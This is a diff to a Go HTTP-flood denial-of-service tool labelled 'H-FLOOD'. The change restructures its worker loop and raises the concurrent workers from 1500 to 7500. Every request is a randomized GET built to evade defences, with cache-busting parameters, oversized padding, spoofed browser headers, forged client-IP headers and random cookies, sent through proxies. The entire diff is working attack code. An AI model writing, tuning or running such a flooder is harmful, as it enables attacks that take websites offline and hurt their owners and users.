@@ -32,10 +32,9 @@ const (
 	LightPink   = "\033[38;5;218m"
 	WhiteBright = "\033[97m"
 
-	wrk = 1500
-	to  = 6 * time.Second
-	sub = 5
-	KEP = 30 * time.Second
+	totalWorkers = 7500
+	to           = 6 * time.Second
+	KEP          = 30 * time.Second
 )
 
 type BPF struct {
@@ -476,7 +475,7 @@ func main() {
 	printInfo("Method", "H-FLOOD                    ", "True")
 	printInfo("Ulimit", "1048576                    ", "True")
 	printInfo("Proxy ", fmt.Sprintf("%d                        ", len(PRX)), "True")
-	printInfo("Worker", fmt.Sprintf("%d                       ", wrk), "True")
+	printInfo("Worker", fmt.Sprintf("%d                       ", totalWorkers), "True")
 	if CostumCookie != "" {
 		fmt.Printf("%s〇%s %sCookie%s %s:%s %s                            [%s%s%s]\n",
 			Green, Reset,
@@ -525,152 +524,144 @@ func main() {
 			cancel()
 		})
 	}
-	for i := 0; i < wrk; i++ {
+
+	for i := 0; i < totalWorkers; i++ {
 		wg.Add(1)
 		c := wcs[i%len(wcs)]
 		go func(cli CLI, workerID int) {
 			defer wg.Done()
 			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))
-			var swg sync.WaitGroup
-			for s := 0; s < sub; s++ {
-				swg.Add(1)
-				go func(subID int) {
-					defer swg.Done()
-					subRng := rand.New(rand.NewSource(rng.Int63()))
-					for ctx.Err() == nil {
-						prof := PFS[subRng.Intn(len(PFS))]
-						Target := tgt
-						param := CBP[subRng.Intn(len(CBP))]
-						if strings.Contains(Target, "?") {
-							Target += "&" + param + "=" + strconv.FormatInt(subRng.Int63(), 10)
-						} else {
-							Target += "?" + param + "=" + strconv.FormatInt(subRng.Int63(), 10)
-						}
-						if MaxP > 0 && subRng.Intn(3) == 0 {
-							size := MaxP/2 + subRng.Intn(MaxP/2)
-							if size < 1 {
-								size = 64
-							}
-							Target += "&big=" + strings.Repeat("x", size)
-						}
-						if subRng.Intn(10) == 0 {
-							Target += "&" + RST(subRng, 8) + "=" + RST(subRng, 12)
-						}
-						req, _ := http.NewRequest("GET", Target, nil)
-
-						req.Header.Set("User-Agent", prof.UA)
-						req.Header.Set("Accept", prof.Accept)
-						req.Header.Set("Accept-Language", prof.Lang)
-						req.Header.Set("Accept-Encoding", prof.Encoding)
-						req.Header.Set("Connection", "keep-alive")
-						req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
-						req.Header.Set("Pragma", "no-cache")
-						req.Header.Set("Upgrade-Insecure-Requests", "1")
-						req.Header.Set("If-Modified-Since", ifModifiedSince)
-						req.Header.Set("X-Cache-Buster", strconv.FormatInt(subRng.Int63(), 16))
-
-						if prof.SecChUa != "" {
-							req.Header.Set("Sec-Ch-Ua", prof.SecChUa)
-							req.Header.Set("Sec-Ch-Ua-Mobile", prof.SecChUaMov)
-							req.Header.Set("Sec-Ch-Ua-Platform", prof.SecChUaPlat)
-						}
-						req.Header.Set("Sec-Fetch-Site", prof.SecFetchSite)
-						req.Header.Set("Sec-Fetch-Mode", prof.SecFetchMode)
-						req.Header.Set("Sec-Fetch-Dest", prof.SecFetchDest)
-
-						if prof.Referer != "" {
-							req.Header.Set("Referer", prof.Referer+host)
-						}
-						if prof.Origin != "" {
-							req.Header.Set("Origin", prof.Origin)
-						}
-						if prof.DNT != "" {
-							req.Header.Set("DNT", prof.DNT)
-						}
-
-						// Header opsional ala Node (tapi gak ngerusak)
-						if subRng.Intn(3) == 0 {
-							req.Header.Set("TE", "trailers")
-						}
-						if subRng.Intn(4) == 0 {
-							req.Header.Set("A-IM", "Feed")
-						}
-						if subRng.Intn(4) == 0 {
-							req.Header.Set("Delta-Base", "12340001")
-						}
-						if subRng.Intn(3) == 0 {
-							req.Header.Set("dnt", "1")
-						}
-						if subRng.Intn(4) == 0 {
-							req.Header.Set("Access-Control-Request-Method", "GET")
-						}
-						if subRng.Intn(5) == 0 {
-							req.Header.Set("source-ip", RST(subRng, 5))
-						}
-						if subRng.Intn(4) == 0 {
-							req.Header.Set("Data-Return", "false")
-						}
-
-						if Supported["X-Original-URL"] && subRng.Intn(3) == 0 {
-							req.Header.Set("X-Original-URL", "/"+strconv.FormatInt(subRng.Int63(), 16))
-						}
-						if Supported["X-Forwarded-Host"] && subRng.Intn(3) == 0 {
-							req.Header.Set("X-Forwarded-Host", strconv.FormatInt(subRng.Int63(), 16)+"t.me/ytdizflyze")
-						}
-						if Supported["X-Request-ID"] && subRng.Intn(3) == 0 {
-							req.Header.Set("X-Request-ID", strconv.FormatInt(subRng.Int63(), 16))
-						}
-						if Supported["CF-Connecting-IP"] && subRng.Intn(5) == 0 {
-							req.Header.Set("CF-Connecting-IP", cli.ip)
-						}
-						if Supported["True-Client-IP"] && subRng.Intn(5) == 0 {
-							req.Header.Set("True-Client-IP", cli.ip)
-						}
-						if Supported["CDN-Loop"] && subRng.Intn(5) == 0 {
-							req.Header.Set("CDN-Loop", "cloudflare")
-						}
-						if subRng.Intn(5) == 0 {
-							req.Header.Set("X-Real-IP", cli.ip)
-						}
-						if MaxHead > 0 && subRng.Intn(2) == 0 {
-							size := MaxHead/2 + subRng.Intn(MaxHead/2)
-							if size < 1 {
-								size = 512
-							}
-							req.Header.Set("X-Large-Data", strings.Repeat("x", size))
-						}
-
-						var cookies []string
-						if CostumCookie != "" {
-							cookies = append(cookies, CostumCookie)
-						}
-						for _, name := range COOKIES {
-							if subRng.Intn(2) == 0 {
-								cookies = append(cookies, name+"="+strconv.FormatInt(subRng.Int63(), 16))
-							}
-						}
-						if len(cookies) > 0 {
-							req.Header.Set("Cookie", strings.Join(cookies, "; "))
-						}
-
-						PID := cli.ip
-						if PID == "" {
-							PID = RIP(subRng)
-						}
-						req.Header.Set("X-Forwarded-For", PID)
-						req.Header.Set("X-Real-IP", PID)
-
-						resp, err := cli.client.Do(req)
-						if err == nil {
-							io.Copy(io.Discard, resp.Body)
-							resp.Body.Close()
-						}
+			for ctx.Err() == nil {
+				prof := PFS[rng.Intn(len(PFS))]
+				Target := tgt
+				param := CBP[rng.Intn(len(CBP))]
+				if strings.Contains(Target, "?") {
+					Target += "&" + param + "=" + strconv.FormatInt(rng.Int63(), 10)
+				} else {
+					Target += "?" + param + "=" + strconv.FormatInt(rng.Int63(), 10)
+				}
+				if MaxP > 0 && rng.Intn(3) == 0 {
+					size := MaxP/2 + rng.Intn(MaxP/2)
+					if size < 1 {
+						size = 64
 					}
-				}(s)
+					Target += "&big=" + strings.Repeat("x", size)
+				}
+				if rng.Intn(10) == 0 {
+					Target += "&" + RST(rng, 8) + "=" + RST(rng, 12)
+				}
+				req, _ := http.NewRequest("GET", Target, nil)
+
+				req.Header.Set("User-Agent", prof.UA)
+				req.Header.Set("Accept", prof.Accept)
+				req.Header.Set("Accept-Language", prof.Lang)
+				req.Header.Set("Accept-Encoding", prof.Encoding)
+				req.Header.Set("Connection", "keep-alive")
+				req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+				req.Header.Set("Pragma", "no-cache")
+				req.Header.Set("Upgrade-Insecure-Requests", "1")
+				req.Header.Set("If-Modified-Since", ifModifiedSince)
+				req.Header.Set("X-Cache-Buster", strconv.FormatInt(rng.Int63(), 16))
+
+				if prof.SecChUa != "" {
+					req.Header.Set("Sec-Ch-Ua", prof.SecChUa)
+					req.Header.Set("Sec-Ch-Ua-Mobile", prof.SecChUaMov)
+					req.Header.Set("Sec-Ch-Ua-Platform", prof.SecChUaPlat)
+				}
+				req.Header.Set("Sec-Fetch-Site", prof.SecFetchSite)
+				req.Header.Set("Sec-Fetch-Mode", prof.SecFetchMode)
+				req.Header.Set("Sec-Fetch-Dest", prof.SecFetchDest)
+
+				if prof.Referer != "" {
+					req.Header.Set("Referer", prof.Referer+host)
+				}
+				if prof.Origin != "" {
+					req.Header.Set("Origin", prof.Origin)
+				}
+				if prof.DNT != "" {
+					req.Header.Set("DNT", prof.DNT)
+				}
+
+				if rng.Intn(3) == 0 {
+					req.Header.Set("TE", "trailers")
+				}
+				if rng.Intn(4) == 0 {
+					req.Header.Set("A-IM", "Feed")
+				}
+				if rng.Intn(4) == 0 {
+					req.Header.Set("Delta-Base", "12340001")
+				}
+				if rng.Intn(3) == 0 {
+					req.Header.Set("dnt", "1")
+				}
+				if rng.Intn(4) == 0 {
+					req.Header.Set("Access-Control-Request-Method", "GET")
+				}
+				if rng.Intn(5) == 0 {
+					req.Header.Set("source-ip", RST(rng, 5))
+				}
+				if rng.Intn(4) == 0 {
+					req.Header.Set("Data-Return", "false")
+				}
+
+				if Supported["X-Original-URL"] && rng.Intn(3) == 0 {
+					req.Header.Set("X-Original-URL", "/"+strconv.FormatInt(rng.Int63(), 16))
+				}
+				if Supported["X-Forwarded-Host"] && rng.Intn(3) == 0 {
+					req.Header.Set("X-Forwarded-Host", strconv.FormatInt(rng.Int63(), 16)+"t.me/ytdizflyze")
+				}
+				if Supported["X-Request-ID"] && rng.Intn(3) == 0 {
+					req.Header.Set("X-Request-ID", strconv.FormatInt(rng.Int63(), 16))
+				}
+				if Supported["CF-Connecting-IP"] && rng.Intn(5) == 0 {
+					req.Header.Set("CF-Connecting-IP", cli.ip)
+				}
+				if Supported["True-Client-IP"] && rng.Intn(5) == 0 {
+					req.Header.Set("True-Client-IP", cli.ip)
+				}
+				if Supported["CDN-Loop"] && rng.Intn(5) == 0 {
+					req.Header.Set("CDN-Loop", "cloudflare")
+				}
+				if rng.Intn(5) == 0 {
+					req.Header.Set("X-Real-IP", cli.ip)
+				}
+				if MaxHead > 0 && rng.Intn(2) == 0 {
+					size := MaxHead/2 + rng.Intn(MaxHead/2)
+					if size < 1 {
+						size = 512
+					}
+					req.Header.Set("X-Large-Data", strings.Repeat("x", size))
+				}
+
+				var cookies []string
+				if CostumCookie != "" {
+					cookies = append(cookies, CostumCookie)
+				}
+				for _, name := range COOKIES {
+					if rng.Intn(2) == 0 {
+						cookies = append(cookies, name+"="+strconv.FormatInt(rng.Int63(), 16))
+					}
+				}
+				if len(cookies) > 0 {
+					req.Header.Set("Cookie", strings.Join(cookies, "; "))
+				}
+
+				PID := cli.ip
+				if PID == "" {
+					PID = RIP(rng)
+				}
+				req.Header.Set("X-Forwarded-For", PID)
+				req.Header.Set("X-Real-IP", PID)
+
+				resp, err := cli.client.Do(req)
+				if err == nil {
+					io.Copy(io.Discard, resp.Body)
+					resp.Body.Close()
+				}
 			}
-			swg.Wait()
 		}(c, i)
 	}
+
 	sig := make(chan os.Signal, 1)
 	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
 	select {
